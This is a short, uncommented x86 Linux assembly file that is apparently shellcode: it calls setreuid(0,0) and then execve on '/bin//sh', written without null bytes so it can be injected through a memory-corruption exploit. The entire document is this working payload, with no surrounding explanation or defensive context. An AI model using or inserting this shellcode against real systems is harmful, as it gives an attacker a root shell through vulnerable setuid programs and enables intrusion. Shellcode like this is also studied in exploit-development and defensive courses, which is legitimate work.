section .text
global _start

_start:
xor eax, eax
mov al, 0x46
xor ebx, ebx
xor ecx, ecx
int 0x80

xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push eax
push ebx
mov ecx, esp
xor edx, edx
mov al, 0xb
int 0x80
